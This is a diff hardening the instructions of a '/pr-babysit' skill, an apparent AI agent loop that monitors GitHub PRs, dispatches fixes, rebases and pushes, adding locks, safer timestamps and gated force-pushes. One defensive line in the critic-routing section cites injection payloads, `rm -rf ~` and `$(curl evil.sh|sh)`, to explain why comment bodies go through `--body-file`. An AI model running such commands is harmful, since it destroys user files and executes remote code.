@@ -152,6 +152,46 @@ If `ESCALATED` is true, print `[ALREADY ESCALATED] <PR_URL> — see slice issue
 to delete `$STATE_DIR/escalated.flag` first (this is intentional — escalation
 means the architector owns it now).
 
+**Acquire a singleton lock so two /pr-babysit instances can't race on the same
+PR** (duplicate tier-1 commits, duplicate critic-route posts, force-push
+clobbers, interleaved writes to `posted-critics.json` / `dispatch-state.json`):
+
+```bash
+PIDFILE="$STATE_DIR/babysit.pid"
+if [[ -f "$PIDFILE" ]]; then
+  EXISTING=$(cat "$PIDFILE")
+  if kill -0 "$EXISTING" 2>/dev/null; then
+    echo "[ALREADY RUNNING] another /pr-babysit holds the lock for PR #$PR_NUMBER (pid $EXISTING)"
+    exit 0
+  fi
+  # Stale pidfile (process died) — clean up and continue.
+fi
+echo $$ > "$PIDFILE"
+trap 'rm -f "$PIDFILE"' EXIT INT TERM
+```
+
+Independently, **acquire a worktree lock before any git mutation** (rebase,
+tier-1 commit, push). The same worktree may be in use by a /coder session
+dispatched in tier-2; concurrent index writes corrupt the repo:
+
+```bash
+WORKTREE_LOCK="$(git rev-parse --git-dir)/pr-babysit.lock"
+acquire_worktree_lock() {
+  # exclusive flock; fails immediately if held by another /pr-babysit or
+  # /coder process.
+  exec 9>"$WORKTREE_LOCK"
+  flock -n 9 || { echo "worktree busy (likely /coder in tmux); deferring mutation"; return 1; }
+}
+release_worktree_lock() {
+  exec 9>&-
+}
+```
+
+Use `acquire_worktree_lock` / `release_worktree_lock` as a guard around 1g
+(tier-1 commit staging), 1i (rebase), and 1j (commit + push). If lock fails,
+SKIP the mutation this round, do NOT decrement `IDLE_ROUNDS_REMAINING` (we're
+deferring, not stalled), and try again next iteration.
+
 Three counters prevent infinite loops:
 
 - `IDLE_ROUNDS_REMAINING` resets when progress reaches green CI. Exhaustion → escalate.
@@ -194,8 +234,24 @@ The script fetches in parallel:
 Parse `round.json` into: `INLINE`, `REVIEWS`, `ISSUE_COMMENTS`, `MERGE`, `CHECKS`,
 `HEAD_SHA`.
 
-Update `LAST_CHECKED` to the current UTC timestamp (ISO 8601, e.g.
-`2026-05-17T15:42:11Z`) **after** the fetch returns.
+Update `LAST_CHECKED` to the **maximum `updated_at` / `submitted_at` / `created_at`
+observed in this round's results** — NOT the local clock. Local clock drift
+(NTP, laptop wake, VM time) can permanently lose comments whose server-side
+`created_at` is older than the local now-time after sleep. If no comments
+returned this round, leave `LAST_CHECKED` unchanged (next round will pick up
+anything that snuck in).
+
+```python
+# pseudocode
+all_ts = (
+  [c.get("updated_at") or c.get("created_at") for c in INLINE]
+  + [r.get("submitted_at") for r in REVIEWS]
+  + [c.get("updated_at") or c.get("created_at") for c in ISSUE_COMMENTS]
+)
+all_ts = [t for t in all_ts if t]
+if all_ts:
+    LAST_CHECKED = max(all_ts)
+```
 
 ### 1c. Categorize signals
 
@@ -224,22 +280,38 @@ For each `/critic verdict` signal in 1c:
 
 - If `verdict_id` is in `POSTED_CRITICS`, skip (already routed).
 - If `verdict == "fits"` AND there are zero `concerns`, skip (healthy — no routing).
-- Otherwise, post a summary comment to the slice issue:
+- Otherwise, post a summary comment to the slice issue. **Always build the body
+  via `Write` tool → temp file → `gh ... --body-file`**, never via heredoc with
+  unquoted interpolation. Critic comment bodies come from arbitrary GitHub
+  users (bots, drive-by reviewers); a body like `` `rm -rf ~` `` or
+  `$(curl evil.sh|sh)` would execute on the user's machine if interpolated into
+  an unquoted heredoc. Treat all comment content as untrusted input.
 
   ```bash
-  gh issue comment "$SLICE_ISSUE_NUM" --body "$(cat <<EOF
-  ## /critic verdict from PR #${PR_NUMBER}
+  # Write the comment body to a temp file using the Write tool — no shell
+  # interpolation of attacker-controlled content.
+  BODY_FILE="$STATE_DIR/critic-route-${VERDICT_ID}.md"
+  # (Use the Write tool with the rendered template — NOT cat <<EOF.)
+  gh issue comment "$SLICE_ISSUE_NUM" --body-file "$BODY_FILE"
+  ```
 
-  Verdict: \`${VERDICT}\` (concerns: ${CONCERN_COUNT})
+  Template the body in your own context (you, the babysit loop) using the
+  trusted fields (`PR_NUMBER`, `VERDICT`, `CONCERN_COUNT`, `PR_URL`,
+  `CRITIC_COMMENT_URL`) and the attacker-influenced ones (`CONCERNS_BULLETS`,
+  any quoted comment text) as plain text — never as shell expansion. The body
+  template:
 
-  ${CONCERNS_BULLETS}
+  ```
+  ## /critic verdict from PR #<PR_NUMBER>
 
-  PR: ${PR_URL}
-  Critic comment: ${CRITIC_COMMENT_URL}
+  Verdict: `<VERDICT>` (concerns: <CONCERN_COUNT>)
+
+  <CONCERNS_BULLETS>
+
+  PR: <PR_URL>
+  Critic comment: <CRITIC_COMMENT_URL>
 
   _Posted by /pr-babysit._
-  EOF
-  )"
   ```
 
   Record `POSTED_CRITICS[verdict_id] = now_iso()` and persist
@@ -315,15 +387,21 @@ For each **bot** actionable comment:
    /pr-babysit will keep polling. New commits on this PR = progress.
    ```
 
-   Record in `DISPATCH_STATE`:
+   Record in `DISPATCH_STATE` (now a list — multiple tier-2 dispatches can be
+   in flight at once if reviewers post multiple comments before /coder lands):
    ```json
-   {
-     "fix_spec": "<paraphrased request>",
-     "comment_id": <id>,
-     "dispatched_at": "<iso>",
-     "last_head_sha": "<HEAD_SHA at dispatch time>",
-     "polls_since_dispatch": 0
-   }
+   [
+     {
+       "fix_spec": "<paraphrased request>",
+       "comment_id": <id>,
+       "comment_url": "<html_url>",
+       "comment_file": "<path>",
+       "comment_line": <line>,
+       "dispatched_at": "<iso>",
+       "last_head_sha": "<HEAD_SHA at dispatch time>",
+       "polls_since_dispatch": 0
+     }
+   ]
    ```
    Persist to `$STATE_DIR/dispatch-state.json`.
 
@@ -333,32 +411,72 @@ For each **bot** actionable comment:
    ```
 
 6. **Subsequent rounds** — if `DISPATCH_STATE` is non-empty at the start of an
-   iteration, check whether `HEAD_SHA` has advanced past `last_head_sha`:
+   iteration, evaluate each entry independently. **Do NOT clear an entry just
+   because HEAD_SHA advanced** — /coder may have pushed off-topic commits, or a
+   commit that doesn't touch the file/line the reviewer flagged. If we clear
+   prematurely, the comment is gone from the loop's view forever (`since=...`
+   filtering won't re-surface it) and the PR can reach READY with the original
+   bug unfixed.
 
-   - **Advanced**: tier-2 dispatch produced a commit. Clear `DISPATCH_STATE`
-     (write `{}` to disk). The new commits will be evaluated naturally by 1g/1h
-     this round. Reset `polls_since_dispatch` implicitly.
-   - **Same SHA**: increment `polls_since_dispatch`. If it reaches 3, count this
-     iteration as 1 failed round (decrement `IDLE_ROUNDS_REMAINING`), reset
-     `polls_since_dispatch = 0`, leave `DISPATCH_STATE` intact (human may still
-     be working on it). Subsequent rounds re-trigger the same "1 failed round
-     after 3 stale polls" rule.
+   Per entry:
+
+   - **Comment thread now has a non-babysit reply** (someone — reviewer or
+     /coder — replied "fixed in <sha>" or marked resolved): clear the entry.
+     Detect via `gh api repos/.../pulls/<n>/comments/<id>/replies` looking for
+     any reply author other than the babysit identity.
+   - **A new commit touches the file/line the comment referenced**: run
+     `git log "$last_head_sha"..HEAD -- "$comment_file"`; if non-empty AND
+     `git diff "$last_head_sha"..HEAD -- "$comment_file"` shows changes within
+     ±5 lines of `comment_line`, post a reply on the thread:
+     `Addressed in <new_sha>. (pr-babysit)` and clear the entry. Reset
+     `IDLE_ROUNDS_REMAINING` because we made visible progress.
+   - **HEAD advanced but no commit touched the comment's file/line**: do NOT
+     clear. Increment `polls_since_dispatch`. The /coder session is doing
+     something else (off-topic work, partial fix); this comment is still open.
+   - **HEAD unchanged**: increment `polls_since_dispatch`. If it reaches 3,
+     count this iteration as 1 failed round for THIS entry (decrement
+     `IDLE_ROUNDS_REMAINING` once even if multiple entries hit 3 in the same
+     round — avoid over-counting), reset its counter to 0, leave the entry
+     alive (human may still be working on it).
 
 ### 1g. Apply tier-1 commits if any landed this round
 
 If any tier-1 fixes were applied in 1f:
 
 ```bash
+acquire_worktree_lock || return 0  # defer this round
 git status --short
 ```
 
-If anything is staged or untracked-but-just-added by the agent, run the project's
-format + lint auto-fix gates (from `.claude/gates.json` if present; otherwise
-infer from manifest — `cargo fmt && cargo clippy --fix`, `ruff check --fix`,
-`npm run lint -- --fix`).
+If anything is staged or untracked-but-just-added by the agent, the agent
+violated its contract ("make ONE commit, do NOT leave unstaged changes"). Do
+NOT auto-stage with `git add -A` — that sweeps `.DS_Store`, editor temp files,
+secrets, and the per-round scratch files at `.claude/pr-babysit/<PR>/` if not
+ignored. Instead:
 
-If `git status` shows nothing new, the agent must have already committed. Skip
-the gates run.
+1. Log the contract violation with the file list (`git status --short`).
+2. `git stash push -u -m 'tier-1 agent left unstaged work'` (preserves the
+   files in case the human wants them).
+3. Reclassify this comment as tier-2 (print the /coder dispatch command).
+4. Continue the loop — the agent's failed attempt is now contained.
+
+If `git status` shows nothing new, the agent committed correctly. Move on to
+read-only gates (no auto-fix — never mutate code without a fresh agent in
+the loop). Use the project's *check* gates only, sourced from
+`.claude/gates.json` if present; otherwise infer from manifest:
+
+- Rust: `cargo fmt-check`, `cargo lint-strict` (per project CLAUDE.md — never
+  `cargo fmt` / `cargo clippy --fix` which silently mutate code).
+- Python: `ruff check` (no `--fix`), `mypy` if `pyproject.toml` configures it.
+- JS/TS: `npm run lint` if defined; no `--fix`.
+
+If a check fails, that's a fresh signal — treat it like CI red and re-enter 1h
+on the next iteration (the failure will appear in `gh pr checks` once pushed).
+Release the worktree lock when done:
+
+```bash
+release_worktree_lock
+```
 
 ### 1h. CI: invoke /diagnose on red, then fix
 
@@ -377,6 +495,19 @@ If any checks are **failing**:
    - `${CLAUDE_PLUGIN_ROOT}/../diagnose/SKILL.md` when /pr-babysit is installed as a plugin
    - `$HOME/.claude/skills/diagnose/SKILL.md` for the user install
    - `<repo-root>/skills/diagnose/SKILL.md` when running from a worktree checkout
+
+   **If none of those paths resolves**, do NOT silently dispatch an Agent with
+   placeholder text — instead, skip the /diagnose call this round and reclassify
+   the CI failure as a tier-2 dispatch with fix-spec "CI red; /diagnose
+   discipline unavailable, investigate failure logs at
+   `$STATE_DIR/round-fail-logs.txt`". Print one warning line so the human sees
+   diagnose was bypassed. Continue the loop.
+
+   Fetch the latest base branch before diffing (1i may not have run this round):
+   ```bash
+   git fetch --quiet origin "$BASE_BRANCH"
+   ```
+
    Capture failure logs:
    ```bash
    for FAIL_RUN in $(echo "$CHECKS" | jq -r '.[] | select(.conclusion=="FAILURE") | .detailsUrl' | grep -oE '[0-9]+$'); do
@@ -443,41 +574,76 @@ If any checks are **failing**:
 If `MERGE.mergeable == "CONFLICTING"` or `MERGE.mergeStateStatus == "DIRTY"`:
 
 ```bash
+acquire_worktree_lock || return 0  # defer this round
 git fetch origin "$BASE_BRANCH"
 git rebase "origin/$BASE_BRANCH"
 ```
 
 If the rebase has conflicts:
-- If > 3 files conflict, abort and bail to tier-2 (print dispatch command with
-  fix-spec "resolve merge conflicts with $BASE_BRANCH").
+- If > 3 files conflict, run `git rebase --abort` and bail to tier-2 (print
+  dispatch command with fix-spec "resolve merge conflicts with $BASE_BRANCH").
 - Otherwise, attempt to resolve inline: for each conflict, read both sides; if
   the resolution is obvious (e.g., one side untouched, other touched), pick the
-  touched side. If non-obvious, abort and bail to tier-2.
+  touched side. If non-obvious, `git rebase --abort` and bail to tier-2.
 
-If resolved: `git rebase --continue` (or `git merge --continue` if you fell back
-to merge).
+If the rebase completed successfully (clean or with all conflicts resolved),
+set `DID_REBASE_THIS_ROUND=true` — this is what gates the
+`--force-with-lease` push in 1j. Without it, 1j only does a normal `git push`.
 
-### 1j. Commit + push if changes were made
+```bash
+DID_REBASE_THIS_ROUND=true
+release_worktree_lock
+```
 
-If `git status --short` is non-empty OR new commits exist beyond
-`$DISPATCH_STATE.last_head_sha`:
+If you fell back to `git merge "origin/$BASE_BRANCH"` instead of rebase (because
+small inline conflicts were resolvable on a merge but not a rebase), do NOT
+set `DID_REBASE_THIS_ROUND` — a merge produces a new commit, which a plain
+`git push` will handle without force.
 
-1. If there are unstaged tier-1 fixes (which were supposed to be committed by
-   their agent), stage and commit:
+### 1j. Push if new commits were made
+
+If new commits exist beyond `$DISPATCH_STATE.last_head_sha` OR a rebase landed
+this round:
+
+1. Acquire the worktree lock (defer the round if held):
    ```bash
-   git add -A
-   git commit -m "fix: address review feedback (tier-1 mechanical fixes)"
+   acquire_worktree_lock || return 0
    ```
 
-2. Push:
+2. There must NOT be unstaged work at this point — 1g's "fail-loud" policy
+   already handled that case. If `git status --short` is non-empty here, abort
+   the push and log a loud warning; reclassify as tier-2 next round. Do NOT
+   `git add -A`.
+
+3. **Push** — gate `--force-with-lease` strictly on a successful rebase this
+   round. A normal push failure (branch protection, transient 5xx, an upstream
+   push from /coder tier-2) must NOT escalate to force-push: that can clobber
+   the human's in-flight work.
+
    ```bash
-   git push || git push --force-with-lease  # after a rebase only
+   git fetch --quiet origin "$BASE_BRANCH"
+   if [[ "${DID_REBASE_THIS_ROUND:-false}" == "true" ]]; then
+     git fetch --quiet origin "$(git branch --show-current)" || true
+     git push --force-with-lease || {
+       echo "[PUSH FAILED after rebase — lease declined; remote moved]"
+       release_worktree_lock
+       return 1  # let the loop decrement IDLE_ROUNDS_REMAINING
+     }
+   else
+     git push || {
+       echo "[PUSH FAILED — branch protection, network, or upstream race]"
+       release_worktree_lock
+       return 1  # do NOT fall through to force-push
+     }
+   fi
+   release_worktree_lock
    ```
 
-3. **Reset `IDLE_ROUNDS_REMAINING` to `max-rounds`** — only if changes pushed
+4. **Reset `IDLE_ROUNDS_REMAINING` to `max-rounds`** — only if changes pushed
    were ours (tier-1) OR represent visible /coder progress.
-4. **Reset `CONSECUTIVE_READY_COUNT` to 0.**
-5. **Set `PUSHED_AT` to current time.**
+5. **Reset `CONSECUTIVE_READY_COUNT` to 0.**
+6. **Set `PUSHED_AT` to current time.**
+7. **Clear `DID_REBASE_THIS_ROUND`** — it's a per-round flag.
 
 **Post-push cooldown**: if `PUSHED_AT` is set and < 60s elapsed, do NOT evaluate
 readiness this round. Skip 1k's READY check; still evaluate escalation conditions.
@@ -527,22 +693,38 @@ If triggered → **escalate**:
    <one paragraph from the architector's perspective — drop?, re-scope?, redispatch?>
    ```
 
-2. Post the summary as a comment on the slice issue:
+2. Post the summary as a comment on the slice issue. **Build the body via the
+   `Write` tool → temp file → `--body-file`**. The summary embeds untrusted
+   content (human comment bodies, critic concerns from arbitrary GitHub users);
+   never shell-interpolate those into a heredoc.
    ```bash
-   gh issue comment "$SLICE_ISSUE_NUM" --body "$SUMMARY"
+   # Write tool: $STATE_DIR/escalation-<round>.md ← rendered template
+   gh issue comment "$SLICE_ISSUE_NUM" --body-file "$STATE_DIR/escalation-<round>.md"
    ```
 
 3. Apply the `architect-attention` label to the slice issue (create label if
-   missing):
+   missing). Capture the exit code — on a fork or with a limited PAT, label
+   creation needs admin scope and will fail; the escalation must still surface:
    ```bash
-   gh issue edit "$SLICE_ISSUE_NUM" --add-label architect-attention 2>/dev/null \
-     || (gh label create architect-attention --color B60205 --description "/pr-babysit escalated; needs architect" \
-         && gh issue edit "$SLICE_ISSUE_NUM" --add-label architect-attention)
+   if ! gh issue edit "$SLICE_ISSUE_NUM" --add-label architect-attention 2>/dev/null; then
+     if ! gh label create architect-attention --color B60205 \
+            --description "/pr-babysit escalated; needs architect" 2>/dev/null; then
+       LABEL_FAILED=1
+     elif ! gh issue edit "$SLICE_ISSUE_NUM" --add-label architect-attention 2>/dev/null; then
+       LABEL_FAILED=1
+     fi
+   fi
+   if [[ "${LABEL_FAILED:-0}" == 1 ]]; then
+     gh issue comment "$SLICE_ISSUE_NUM" \
+       --body "NOTE: could not apply 'architect-attention' label (permission denied) — please add manually."
+   fi
    ```
 
-4. Post a one-line comment on the PR linking to the slice issue:
+4. Post a one-line comment on the PR linking to the slice issue. The literal
+   strings are babysit-controlled, no untrusted interpolation here:
    ```bash
-   gh pr comment "$PR_NUMBER" --body "[/pr-babysit] Escalated to slice #$SLICE_ISSUE_NUM (architect-attention). $PR_URL"
+   gh pr comment "$PR_NUMBER" \
+     --body "[/pr-babysit] Escalated to slice #$SLICE_ISSUE_NUM (architect-attention). $PR_URL"
    ```
 
 5. Touch `$STATE_DIR/escalated.flag` so subsequent /pr-babysit invocations refuse
@@ -599,9 +781,13 @@ Under `.claude/pr-babysit/<PR_NUMBER>/`:
 - `diagnosis-<N>.md` — diagnosis report from /diagnose, one per round that had CI red.
 - `round.json`, `round-fail-logs.txt`, `round-diff.patch` — per-iteration scratch (overwritten each round).
 
-All under `.claude/` so they're worktree-local and respected by the project's
-existing `.gitignore` (add `.claude/pr-babysit/` to `.gitignore` if not already
-ignored by a broader `.claude/` rule).
+All under `.claude/` so they're worktree-local. This repo's root `.gitignore`
+already ignores `.claude/` broadly, so state files cannot leak into commits. If
+you adopt /pr-babysit in a repo without that rule, **the loop's setup MUST
+verify and add `.claude/pr-babysit/` to `.gitignore`** before writing any state
+— otherwise a stray `git add -A` from a misbehaving tier-1 agent could commit
+the per-round scratch files (which can include CI failure logs containing
+secrets).
 
 ## Subagent contract
 
@@ -629,6 +815,16 @@ ignored by a broader `.claude/` rule).
 | Re-running after escalation | Refuses unless the human deletes `$STATE_DIR/escalated.flag` (architector now owns the PR). |
 | Sleeping during gate decisions | There are no gate decisions in AFK mode. Everything either auto-fixes or escalates. |
 | Missing `Parent slice: #N` header in PR body | Bail at 0b with the exact fix instruction. /coder PRs (S8+) include this; backfill manually for older PRs. |
+| Heredoc-interpolating critic / human comment text into a `gh` command | RCE risk — comment bodies are attacker-controlled. ALWAYS render to a temp file via Write tool, pass `--body-file`. Never `<<EOF` with `${var}` of untrusted content. |
+| Clearing tier-2 DISPATCH_STATE on any HEAD advance | /coder may push off-topic commits. Only clear when the comment thread shows resolution OR a new commit actually touches the comment's file/line. |
+| `git add -A` to clean up after a misbehaving tier-1 agent | Sweeps `.DS_Store`, editor temps, scratch files (which may contain CI logs with secrets). Stash + reclassify as tier-2 instead. |
+| Running two /pr-babysit on the same PR | Acquire `$STATE_DIR/babysit.pid` lock at startup; exit `[ALREADY RUNNING]` if held by a live pid. |
+| Concurrent worktree mutation with a /coder tmux session | `flock` on `$GIT_DIR/pr-babysit.lock` before any rebase / commit / push. Defer the round if held. |
+| `git push || git push --force-with-lease` ungated | Only force-with-lease when `DID_REBASE_THIS_ROUND=true`. A normal push failure (branch protection, upstream race) must fail loudly, not escalate to force. |
+| Mutating gates (`cargo fmt`, `ruff --fix`) in 1g | Use `*-check` variants only. Auto-mutation without a fresh agent in the loop is silent code edits. |
+| /diagnose path missing → empty prompt | If all three install-layout paths miss, skip /diagnose this round and tier-2 the failure with a "diagnose unavailable" fix-spec. Don't dispatch with placeholder content. |
+| LAST_CHECKED from local clock | Use the max `updated_at`/`submitted_at`/`created_at` seen in this round's results. Local clock drift permanently loses comments after wake/NTP. |
+| Filtering only by `created_at` | Bots EDIT their summary comment. Use `(updated_at // created_at)` so edits get re-triaged. |
 
 ## Relationship to other skills
 
